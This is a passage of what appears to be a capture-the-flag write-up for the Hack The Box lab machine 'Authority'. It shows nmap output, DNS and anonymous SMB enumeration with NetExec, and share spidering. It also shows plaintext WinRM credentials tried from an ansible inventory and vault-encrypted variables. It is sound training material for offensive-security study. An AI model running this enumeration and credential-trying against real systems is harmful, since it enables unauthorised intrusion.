+<li>port 636, 3269 → LDAP over SSL</li>
+<li>port 5985, 47001 → wsman and winrm</li>
+<li>port 8443 → HTTPS</li>
+</ul>
+<p>The script scan of LDAP ports leaks the domains <code>authority.htb</code> and <code>authority.htb.corp</code>. Furthermore, the HTTPS site on port 8443 might be within a Docker container, as its SSL certificate&rsquo;s common name is set to <code>172.16.2.118</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#nmap -p53,88,135,139,80,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49667,49666,49671,49684,49688,49664,49665,49685,49687,49699,49697,49711,58545 -sV -sC -T4 -Pn -oA 10.10.11.222 10.10.11.222</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-08-05 02:01 IST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.222
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.062s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">53/tcp    open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">80/tcp    open  http          Microsoft IIS httpd 10.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: IIS Windows Server
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2023-08-05 00:31:08Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: authority.htb, Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: UPN::AUTHORITY<span class="nv">$@</span>htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2022-08-09T23:03:21
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2024-08-09T23:13:21
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2023-08-05T00:32:07+00:00<span class="p">;</span> +3h59m59s from scanner time.
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: authority.htb, Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: UPN::AUTHORITY<span class="nv">$@</span>htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2022-08-09T23:03:21
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2024-08-09T23:13:21
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2023-08-05T00:32:07+00:00<span class="p">;</span> +3h59m59s from scanner time.
+</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: authority.htb, Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2023-08-05T00:32:07+00:00<span class="p">;</span> +3h59m59s from scanner time.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: UPN::AUTHORITY<span class="nv">$@</span>htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2022-08-09T23:03:21
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2024-08-09T23:13:21
+</span></span><span class="line"><span class="cl">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: authority.htb, Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: UPN::AUTHORITY<span class="nv">$@</span>htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2022-08-09T23:03:21
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2024-08-09T23:13:21
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2023-08-05T00:32:07+00:00<span class="p">;</span> +3h59m59s from scanner time.
+</span></span><span class="line"><span class="cl">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl">8443/tcp  open  ssl/https-alt
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>172.16.2.118
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2023-08-02T09:54:30
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2025-08-03T21:32:54
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesnt have a title <span class="o">(</span>text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>ISO-8859-1<span class="o">)</span>.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   FourOhFourRequest, GetRequest:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">200</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>ISO-8859-1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">82</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Sat, <span class="m">05</span> Aug <span class="m">2023</span> 00:31:14 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;html&gt;&lt;head&gt;&lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;refresh&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;0;URL=&#39;/pwm&#39;&#34;</span>/&gt;&lt;/head&gt;&lt;/html&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   HTTPOptions:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">200</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Allow: GET, HEAD, POST, OPTIONS
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Sat, <span class="m">05</span> Aug <span class="m">2023</span> 00:31:14 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   RTSPRequest:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">400</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>utf-8
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Language: en
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">1936</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Sat, <span class="m">05</span> Aug <span class="m">2023</span> 00:31:20 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;!doctype html&gt;&lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span>&gt;&lt;head&gt;&lt;title&gt;HTTP Status <span class="m">400</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Request&lt;/title&gt;&lt;style <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span>&gt;body <span class="o">{</span>font-family:Tahoma,Arial,sans-serif<span class="p">;</span><span class="o">}</span> h1, h2, h3, b <span class="o">{</span>color:white<span class="p">;</span>background-color:#525D76<span class="p">;</span><span class="o">}</span> h1 <span class="o">{</span>font-size:22px<span class="p">;</span><span class="o">}</span> h2 <span class="o">{</span>font-size:16px<span class="p">;</span><span class="o">}</span> h3 <span class="o">{</span>font-size:14px<span class="p">;</span><span class="o">}</span> p <span class="o">{</span>font-size:12px<span class="p">;</span><span class="o">}</span> a <span class="o">{</span>color:black<span class="p">;</span><span class="o">}</span> .line <span class="o">{</span>height:1px<span class="p">;</span>background-color:#525D76<span class="p">;</span>border:none<span class="p">;</span><span class="o">}</span>&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status <span class="m">400</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Request&lt;/h1&gt;&lt;hr <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;line&#34;</span> /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Exception Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; Invalid character found in the HTTP protocol <span class="o">[</span>RTSP<span class="p">&amp;</span><span class="c1">#47;1.00x0d0x0a0x0d0x0a...]&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid</span>
+</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span class="line"><span class="cl">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl">49664/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49665/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49666/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49671/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49684/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">49685/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49687/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49688/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49697/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49699/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49711/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">58545/tcp open  msrpc         Microsoft Windows RPC
+</span></span></code></pre></div><h3 id="port-53---dns" class="relative group">port 53 - DNS <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#port-53---dns" aria-label="Anchor">#</a></span></h3><p>DNS resolution maps both domains from nmap. However, since zone transfer failed, no other significant information from DNS</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ dig +noall +answer authority.htb @10.129.216.215
+</span></span><span class="line"><span class="cl">authority.htb.          <span class="m">600</span>     IN      A       10.129.216.215
+</span></span><span class="line"><span class="cl">authority.htb.          <span class="m">600</span>     IN      A       10.129.229.30
+</span></span><span class="line"><span class="cl">authority.htb.          <span class="m">600</span>     IN      A       10.129.229.56
+</span></span><span class="line"><span class="cl">❯ dig +noall +answer authority.htb.corp @10.129.216.215
+</span></span><span class="line"><span class="cl">authority.htb.corp.     <span class="m">1200</span>    IN      A       10.129.216.215
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ dig axfr @10.10.11.222 authority.htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.18.16-1-Debian &lt;&lt;&gt;&gt; axfr @10.10.11.222 authority.htb
+</span></span><span class="line"><span class="cl"><span class="p">;</span> <span class="o">(</span><span class="m">1</span> server found<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">;;</span> global options: +cmd
+</span></span><span class="line"><span class="cl"><span class="p">;</span> Transfer failed.
+</span></span></code></pre></div><h3 id="port-445---smb" class="relative group">port 445 - SMB <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#port-445---smb" aria-label="Anchor">#</a></span></h3><p>SMB has anonymous login enabled, with which I have read access to the <code>Development</code> share.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc smb 10.10.11.222 -u  <span class="s1">&#39;guest&#39;</span> -p <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>+<span class="o">]</span> authority.htb<span class="se">\g</span>uest:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ nxc smb 10.10.11.222 -u  <span class="s1">&#39;guest&#39;</span> -p <span class="s1">&#39;&#39;</span> --shares
+</span></span><span class="line"><span class="cl">SMB         10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>+<span class="o">]</span> authority.htb<span class="se">\g</span>uest:
+</span></span><span class="line"><span class="cl">SMB         10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span> Enumerated shares
+</span></span><span class="line"><span class="cl">SMB         10.10.11.222   <span class="m">445</span>    AUTHORITY        Share           Permissions     Remark
+</span></span><span class="line"><span class="cl">SMB         10.10.11.222   <span class="m">445</span>    AUTHORITY        -----           -----------     ------
+</span></span><span class="line"><span class="cl">SMB         10.10.11.222   <span class="m">445</span>    AUTHORITY        ADMIN$                          Remote Admin
+</span></span><span class="line"><span class="cl">SMB         10.10.11.222   <span class="m">445</span>    AUTHORITY        C$                              Default share
+</span></span><span class="line"><span class="cl">SMB         10.10.11.222   <span class="m">445</span>    AUTHORITY        Department Shares
+</span></span><span class="line"><span class="cl">SMB         10.10.11.222   <span class="m">445</span>    AUTHORITY        Development     READ
+</span></span><span class="line"><span class="cl">SMB         10.10.11.222   <span class="m">445</span>    AUTHORITY        IPC$            READ            Remote IPC
+</span></span><span class="line"><span class="cl">SMB         10.10.11.222   <span class="m">445</span>    AUTHORITY        NETLOGON                        Logon server share
+</span></span><span class="line"><span class="cl">SMB         10.10.11.222   <span class="m">445</span>    AUTHORITY        SYSVOL                          Logon server share
+</span></span></code></pre></div><p>With NetExec&rsquo;s SMB spider plus module, I was able to spider the readable shares and download relevant files.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc smb 10.10.11.222 -u  <span class="s1">&#39;guest&#39;</span> -p <span class="s1">&#39;&#39;</span> -M spider_plus -o <span class="nv">DOWNLOAD_FLAG</span><span class="o">=</span><span class="nb">true</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>+<span class="o">]</span> authority.htb<span class="se">\g</span>uest:
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span> Started module spidering_plus with the following options:
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span>  DOWNLOAD_FLAG: True
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span>     STATS_FLAG: True
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span> EXCLUDE_FILTER: <span class="o">[</span><span class="s1">&#39;print$&#39;</span>, <span class="s1">&#39;ipc$&#39;</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span>   EXCLUDE_EXTS: <span class="o">[</span><span class="s1">&#39;ico&#39;</span>, <span class="s1">&#39;lnk&#39;</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span>  MAX_FILE_SIZE: <span class="m">50</span> KB
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span>  OUTPUT_FOLDER: /tmp/nxc_spider_plus
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>+<span class="o">]</span> Saved share-file metadata to <span class="s2">&#34;/tmp/nxc_spider_plus/10.10.11.222.json&#34;</span>.
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span> SMB Shares:           <span class="m">7</span> <span class="o">(</span>ADMIN$, C$, Department Shares, Development, IPC$, NETLOGON, SYSVOL<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span> SMB Readable Shares:  <span class="m">2</span> <span class="o">(</span>Development, IPC$<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span> SMB Filtered Shares:  <span class="m">1</span>
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span> Total folders found:  <span class="m">27</span>
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span> Total files found:    <span class="m">52</span>
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span> File size average:    1.5 KB
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span> File size min:        <span class="m">4</span> B
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span> File size max:        11.1 KB
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span> File unique exts:     <span class="m">6</span> <span class="o">(</span>.txt, .md, .yml, .j2, .cfg, .ini<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span> Downloads successful: <span class="m">52</span>
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>+<span class="o">]</span> All files processed successfully.
+</span></span></code></pre></div><p>Going through the findings, I discovered what looks like ansible playbooks in the <code>Development\Automation\Ansible</code> subdirectory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ l /tmp/nxc_spider_plus/10.10.11.222/Development/Automation/Ansible
+</span></span><span class="line"><span class="cl">Permissions Size User    Date Modified Name
+</span></span><span class="line"><span class="cl">drwxr-xr-x     - abraxas <span class="m">30</span> Nov 18:07  ADCS
+</span></span><span class="line"><span class="cl">drwxr-xr-x     - abraxas <span class="m">30</span> Nov 18:07  LDAP
+</span></span><span class="line"><span class="cl">drwxr-xr-x     - abraxas <span class="m">30</span> Nov 18:07  PWM
+</span></span><span class="line"><span class="cl">drwxr-xr-x     - abraxas <span class="m">30</span> Nov 18:07  SHARE
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ cat /tmp/nxc_spider_plus/10.10.11.222.json <span class="p">|</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>jq -r <span class="s1">&#39;.Development | keys_unsorted[]&#39;</span> <span class="p">|</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>awk -F <span class="s1">&#39;/&#39;</span> <span class="s1">&#39;{sub($1 FS $2 FS, &#34;&#34;); print}&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ADCS/.ansible-lint
+</span></span><span class="line"><span class="cl">ADCS/.yamllint
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">ADCS/tasks/assert.yml
+</span></span><span class="line"><span class="cl">ADCS/tasks/generate_ca_certs.yml
+</span></span><span class="line"><span class="cl">ADCS/tasks/init_ca.yml
+</span></span><span class="line"><span class="cl">ADCS/tasks/main.yml
+</span></span><span class="line"><span class="cl">ADCS/tasks/requests.yml
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">LDAP/handlers/main.yml
+</span></span><span class="line"><span class="cl">LDAP/meta/main.yml
+</span></span><span class="line"><span class="cl">LDAP/tasks/main.yml
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">PWM/README.md
+</span></span><span class="line"><span class="cl">PWM/ansible.cfg
+</span></span><span class="line"><span class="cl">PWM/ansible_inventory
+</span></span><span class="line"><span class="cl">PWM/defaults/main.yml
+</span></span><span class="line"><span class="cl">PWM/handlers/main.yml
+</span></span><span class="line"><span class="cl">PWM/meta/main.yml
+</span></span><span class="line"><span class="cl">PWM/tasks/main.yml
+</span></span><span class="line"><span class="cl">PWM/templates/context.xml.j2
+</span></span><span class="line"><span class="cl">PWM/templates/tomcat-users.xml.j2
+</span></span><span class="line"><span class="cl">SHARE/tasks/main.yml
+</span></span></code></pre></div><p>In the <code>PWM</code> subdirectory, I came across intriguing files, including inventory, configuration, variables, and ansible tasks.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">├── PWM
+</span></span><span class="line"><span class="cl">│   ├── ansible.cfg
+</span></span><span class="line"><span class="cl">│   ├── ansible_inventory
+</span></span><span class="line"><span class="cl">│   ├── defaults
+</span></span><span class="line"><span class="cl">│   │   └── main.yml
+</span></span><span class="line"><span class="cl">│   ├── handlers
+</span></span><span class="line"><span class="cl">│   │   └── main.yml
+</span></span><span class="line"><span class="cl">│   ├── meta
+</span></span><span class="line"><span class="cl">│   │   └── main.yml
+</span></span><span class="line"><span class="cl">│   ├── README.md
+</span></span><span class="line"><span class="cl">│   ├── tasks
+</span></span><span class="line"><span class="cl">│   │   └── main.yml
+</span></span><span class="line"><span class="cl">│   └── templates
+</span></span><span class="line"><span class="cl">│       ├── context.xml.j2
+</span></span><span class="line"><span class="cl">│       └── tomcat-users.xml.j2
+</span></span><span class="line"><span class="cl">└── SHARE
+</span></span><span class="line"><span class="cl">    └── tasks
+</span></span><span class="line"><span class="cl">        └── main.yml
+</span></span></code></pre></div><p>I found WinRM credentials in the inventory file. Unfortunately, the creds don&rsquo;t work.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ cat PWM/ansible_inventory
+</span></span><span class="line"><span class="cl">ansible_user: administrator
+</span></span><span class="line"><span class="cl">ansible_password: Welcome1
+</span></span><span class="line"><span class="cl">ansible_port: <span class="m">5985</span>
+</span></span><span class="line"><span class="cl">ansible_connection: winrm
+</span></span><span class="line"><span class="cl">ansible_winrm_transport: ntlm
+</span></span><span class="line"><span class="cl">ansible_winrm_server_cert_validation: ignore
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ nxc winrm 10.10.11.222 -u <span class="s1">&#39;administrator&#39;</span> -p <span class="s1">&#39;Welcome1&#39;</span>
+</span></span><span class="line"><span class="cl">WINRM       10.10.11.222   <span class="m">5985</span>   AUTHORITY        <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span>
+</span></span><span class="line"><span class="cl">WINRM       10.10.11.222   <span class="m">5985</span>   AUTHORITY        <span class="o">[</span>-<span class="o">]</span> authority.htb<span class="se">\a</span>dministrator:Welcome1
+</span></span></code></pre></div><p>Within the <code>defaults/main.yml</code> file, I found a few variables encrypted using ansible-vault. These encrypted variables, particularly within the default directory, could be interesting.</p>
+<p><em>defaults/main.yml</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yml" data-lang="yml"><span class="line"><span class="cl"><span class="nn">---</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">pwm_run_dir</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;{{ lookup(&#39;env&#39;, &#39;PWD&#39;) }}&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">pwm_hostname</span><span class="p">:</span><span class="w"> </span><span class="l">authority.htb.corp</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">pwm_http_port</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;{{ http_port }}&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">pwm_https_port</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;{{ https_port }}&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">pwm_https_enable</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">pwm_require_ssl</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">pwm_admin_login</span><span class="p">:</span><span class="w"> </span>!<span class="l">vault |</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="l">$ANSIBLE_VAULT;1.1;AES256</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="m">32666534386435366537653136663731633138616264323230383566333966346662313161326239</span><span class="w">
